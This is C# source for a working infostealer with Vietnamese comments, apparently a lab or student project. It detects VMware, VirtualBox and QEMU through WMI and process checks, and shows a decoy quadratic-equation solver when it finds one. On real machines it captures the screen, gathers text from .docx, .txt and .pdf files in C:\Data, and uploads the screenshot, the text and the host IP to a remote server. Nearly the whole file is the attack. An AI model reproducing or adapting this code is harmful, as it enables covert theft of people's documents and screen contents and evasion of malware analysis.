using iText.Kernel.Pdf;
using iText.Kernel.Pdf.Canvas.Parser;
using iText.Kernel.Pdf.Canvas.Parser.Listener;
using Spire.Doc;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;

            // test 1
            //if (!CheckNotVirtualMachine())
            //{
            //    SolveQuadraticEquation();
            //}


            // test 2
            //Progress();
            //SolveQuadraticEquation();

            // test 3
            //string ipv4Address = GetIPv4();
            //Console.WriteLine("IPv4 Address: " + ipv4Address);

            if (CheckVirtualMachine())
            {
                SolveQuadraticEquation();
                return;
            }

            // Progress();

            // Chụp ảnh màn hình
            Bitmap screenshot = CaptureScreen();

            // Lưu ảnh vào thư mục temp
            SaveToTempFolder(screenshot);
            Console.WriteLine("Ảnh đã lưu vào temp");

            CollectFile();
            Console.WriteLine("Đã thu thập file");
            Console.ReadLine();
        }

        static void Progress()
        {
            Console.WriteLine("Đang khởi tạo chương trình:");

            for (int i = 1; i <= 100; i++)
            {
                UpdateProgress(i);
                System.Threading.Thread.Sleep(100);
            }
            Console.WriteLine("\n");
        }

        static void UpdateProgress(int percentage)
        {
            Console.CursorLeft = 0;
            Console.Write("[");
            Console.CursorLeft = 65;
            Console.Write("]");

            double progress = percentage / 100.0;
            int position = 1 + (int)(60 * progress);

            Console.CursorLeft = 1;
            Console.Write(new string('#', position - 1));
            Console.CursorLeft = position;
            Console.Write(percentage.ToString("00") + "%");
        }

        static Bitmap CaptureScreen()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            Bitmap screenshot = new Bitmap(screenWidth, screenHeight);
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));
            }

            return screenshot;
        }

        static void SaveToTempFolder(Bitmap screenshot)
        {
            string tempFolderPath = Path.Combine(Path.GetTempPath(), "Hacker");
            if (!Directory.Exists(tempFolderPath))
            {
                Directory.CreateDirectory(tempFolderPath);
            }
            string fileName = $"screenshot_{DateTime.Now:yyyyMMddHHmmss}.png";

            string filePath = Path.Combine(tempFolderPath, fileName);

            screenshot.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);

            // Gửi ảnh đến API /upload_image
            string imageUploadUrl = "http://192.168.43.107:5000/upload_file";
            PostImageToAPI(filePath, imageUploadUrl);
        }

        static void CollectFile()
        {
            string sourceFolder = @"C:\Data";
            string tempFolderPath = Path.Combine(Path.GetTempPath(), "Hacker");
            string outputPath = Path.Combine(tempFolderPath, "CombinedFile.txt");
            string[] fileTypes = { "*.docx", "*.txt", "*.pdf" };
            StringBuilder combinedContent = new StringBuilder();
            foreach (string fileType in fileTypes)
            {
                string[] files = Directory.GetFiles(sourceFolder, fileType);

                foreach (string file in files)
                {
                    string content = ReadFileContent(file);
                    combinedContent.AppendLine(content);
                }
            }
            File.WriteAllText(outputPath, combinedContent.ToString());
            Console.WriteLine($"Saved file in: {outputPath}");

            string ipv4Address = GetIPv4();

            // Gửi văn bản đến API /upload_text
            string textUploadUrl = "http://192.168.43.107:5000/upload_text";
            PostTextToAPI("IP " + ipv4Address + ": " + combinedContent.ToString(), textUploadUrl);
        }

        static string ReadFileContent(string filePath)
        {
            string content = "";

            // Đọc nội dung từ file dựa trên định dạng
            if (filePath.EndsWith(".docx"))
            {
                // Sử dụng thư viện Spire.Doc để đọc nội dung từ file docx
                Document document = new Document();
                document.LoadFromFile(filePath);
                content = document.GetText();
            }
            else if (filePath.EndsWith(".txt"))
            {
                // Đọc nội dung từ file văn bản
                content = File.ReadAllText(filePath);
            }
            else if (filePath.EndsWith(".pdf"))
            {
                // Sử dụng thư viện iTextSharp để đọc nội dung từ file pdf
                using (PdfReader pdfReader = new PdfReader(filePath))
                using (PdfDocument pdfDocument = new PdfDocument(pdfReader))
                {
                    // Lấy số lượng trang trong tài liệu PDF
                    int numberOfPages = pdfDocument.GetNumberOfPages();

                    // Duyệt qua từng trang và đọc nội dung
                    for (int i = 1; i <= numberOfPages; i++)
                    {
                        // Sử dụng LocationTextExtractionStrategy để trích xuất văn bản từ mỗi trang
                        LocationTextExtractionStrategy strategy = new LocationTextExtractionStrategy();
                        PdfCanvasProcessor canvasProcessor = new PdfCanvasProcessor(strategy);
                        canvasProcessor.ProcessPageContent(pdfDocument.GetPage(i));
                        content += strategy.GetResultantText();
                    }
                }
            }
            return content;
        }

        static bool CheckVirtualMachine()
        {
            bool isVirtualMachine = false;

            // Kiểm tra thông tin về hệ thống
            ManagementObjectSearcher systemSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
            foreach (ManagementObject obj in systemSearcher.Get())
            {
                string manufacturer = obj["Manufacturer"].ToString().ToLower();
                string model = obj["Model"].ToString().ToLower();

                if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
                    model.Contains("vmware") || model.Contains("virtualbox"))
                {
                    isVirtualMachine = true;
                    Console.WriteLine($"CheckSystem: {manufacturer}: Virtual Machine");
                    break;
                }
                Console.WriteLine($"CheckSystem: {manufacturer}: Physical Machine");
            }

            // Kiểm tra thông tin về CPU
            ManagementObjectSearcher cpuSearcher = new ManagementObjectSearcher("Select * from Win32_Processor");
            foreach (ManagementObject obj in cpuSearcher.Get())
            {
                string cpuManufacturer = obj["Manufacturer"].ToString().ToLower();
                string cpuName = obj["Name"].ToString().ToLower();

                if (cpuManufacturer.Contains("vmware") || cpuManufacturer.Contains("virtualbox") ||
                    cpuName.Contains("vmware") || cpuName.Contains("virtualbox"))
                {
                    isVirtualMachine = true;
                    Console.WriteLine($"CheckProcessor: {cpuManufacturer}: Virtual Machine");
                    break;
                }
                Console.WriteLine($"CheckProcessor: {cpuManufacturer}: Physical Machine");
            }

            // Kiểm tra thông tin BIOS
            ManagementObjectSearcher biosSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS");
            foreach (ManagementObject obj in biosSearcher.Get())
            {
                string manufacturer = obj["Manufacturer"].ToString().ToLower();
                string serialNumber = obj["SerialNumber"].ToString().ToLower();

                if (!string.IsNullOrEmpty(manufacturer) && !string.IsNullOrEmpty(serialNumber) &&
                    (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") || manufacturer.Contains("qemu") ||
                    serialNumber.Contains("vmware") || serialNumber.Contains("virtualbox") || serialNumber.Contains("qemu")))
                {
                    isVirtualMachine = true;
                    Console.WriteLine($"CheckBIOS: {manufacturer}: Virtual Machine");
                    break;
                }
                Console.WriteLine($"CheckBIOS: {manufacturer}: Physical Machine");
            }

            // Kiểm tra thông tin ổ cứng
            ManagementObjectSearcher driveSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
            foreach (ManagementObject obj in driveSearcher.Get())
            {
                string model = obj["Model"].ToString().ToLower();

                if (!string.IsNullOrEmpty(model) && (model.Contains("virtual") || model.Contains("vmware") || model.Contains("virtualbox") || model.Contains("qemu")))
                {
                    isVirtualMachine = true;
                    Console.WriteLine($"CheckDiskDrive: {model}: Virtual Machine");
                    break;
                }
                Console.WriteLine($"CheckDiskDrive: {model}: Physical Machine");
            }

            // Kiểm tra dịch vụ Windows
            ManagementObjectSearcher serviceSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Service");
            foreach (ManagementObject obj in serviceSearcher.Get())
            {
                string displayName = obj["DisplayName"].ToString().ToLower();

                if (!string.IsNullOrEmpty(displayName) && (displayName.Contains("vmtools") || displayName.Contains("virtualbox") || displayName.Contains("qemu")))
                {
                    isVirtualMachine = true;
                    Console.WriteLine($"CheckService: {displayName}: Virtual Machine");
                    break;
                }
                Console.WriteLine($"CheckService: {displayName}: Physical Machine");
            }

            // Kiểm tra các tiến trình ảo hóa
            string[] virtualMachineProcesses = { "vmtoolsd", "vmwaretray", "vboxtray", "vboxservice" };

            foreach (string processName in virtualMachineProcesses)
            {
                if (Process.GetProcessesByName(processName).Length > 0)
                {
                    isVirtualMachine = true;
                    Console.WriteLine("CheckVirtual: Virtual Machine");
                    break;
                }
                Console.WriteLine("CheckVirtual: Physical Machine");
            }

            return isVirtualMachine;
        }

        static async void PostImageToAPI(string imagePath, string uploadUrl)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                using (MultipartFormDataContent content = new MultipartFormDataContent())
                using (FileStream fileStream = File.OpenRead(imagePath))
                {
                    // Đọc dữ liệu từ file và thêm vào nội dung yêu cầu
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(imagePath));

                    // Gửi yêu cầu POST tới API
                    HttpResponseMessage response = await client.PostAsync(uploadUrl, content);

                    // Đọc phản hồi từ máy chủ
                    string responseString = await response.Content.ReadAsStringAsync();

                    // In ra kết quả
                    Console.WriteLine(responseString);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        static void PostTextToAPI(string text, string uploadUrl)
        {
            try
            {
                // Tạo đối tượng HttpClient
                using (HttpClient client = new HttpClient())
                {
                    // Chuyển dữ liệu văn bản thành dạng StringContent
                    string cleanText = RemoveNewLineCharacters(text);
                    StringContent content = new StringContent($"{{\"text\": \"{cleanText}\"}}", Encoding.UTF8, "application/json");

                    // Gửi yêu cầu POST tới API và nhận phản hồi
                    HttpResponseMessage response = client.PostAsync(uploadUrl, content).Result;

                    // Đọc phản hồi từ máy chủ
                    string responseString = response.Content.ReadAsStringAsync().Result;

                    // In ra kết quả
                    Console.WriteLine(responseString);
                }
            }
            catch (Exception ex)
            {
                // Xử lý ngoại lệ nếu có lỗi
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        static string RemoveNewLineCharacters(string input)
        {
            // Sử dụng phương thức Replace để thay thế các ký tự \r\n bằng chuỗi rỗng
            string cleanText = input.Replace("\r\n", "");

            return cleanText;
        }

        static void SolveQuadraticEquation()
        {
            double a, b, c;

            // Nhập các hệ số từ người dùng
            Console.WriteLine("---------------CHƯƠNG TRÌNH GIẢI PHƯƠNG TRÌNH BẬC 2---------------");
            Console.WriteLine("Nhập các hệ số của phương trình ax^2 + bx + c = 0");
            Console.Write("Nhập hệ số a: ");
            a = Convert.ToDouble(Console.ReadLine());

            Console.Write("Nhập hệ số b: ");
            b = Convert.ToDouble(Console.ReadLine());

            Console.Write("Nhập hệ số c: ");
            c = Convert.ToDouble(Console.ReadLine());

            double delta = b * b - 4 * a * c;
            double x1, x2;

            // Kiểm tra điều kiện để giải phương trình bậc 2
            if (delta > 0)
            {
                // Có hai nghiệm phân biệt
                x1 = (-b + Math.Sqrt(delta)) / (2 * a);
                x2 = (-b - Math.Sqrt(delta)) / (2 * a);
                Console.WriteLine("Phương trình có hai nghiệm phân biệt:");
                Console.WriteLine("x1 = " + x1);
                Console.WriteLine("x2 = " + x2);
            }
            else if (delta == 0)
            {
                // Có nghiệm kép
                x1 = -b / (2 * a);
                Console.WriteLine("Phương trình có một nghiệm kép:");
                Console.WriteLine("x = " + x1);
            }
            else
            {
                // Không có nghiệm thực
                Console.WriteLine("Phương trình không có nghiệm thực.");
            }
            Console.ReadLine(); // Để chương trình không đóng ngay sau khi thực thi xong.
        }

        static string GetIPv4()
        {
            string ipAddress = String.Empty;

            try
            {
                // Lấy tất cả các giao diện mạng của máy tính
                IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());

                // Lặp qua từng địa chỉ IP để tìm IPv4
                foreach (IPAddress addr in localIPs)
                {
                    // Kiểm tra xem địa chỉ IP có phải là IPv4 không
                    if (addr.AddressFamily == AddressFamily.InterNetwork)
                    {
                        ipAddress = addr.ToString();
                        //break; // Đã tìm thấy IPv4, thoát vòng lặp
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error getting IPv4 address: " + ex.Message);
            }

            return ipAddress;
        }
    }
}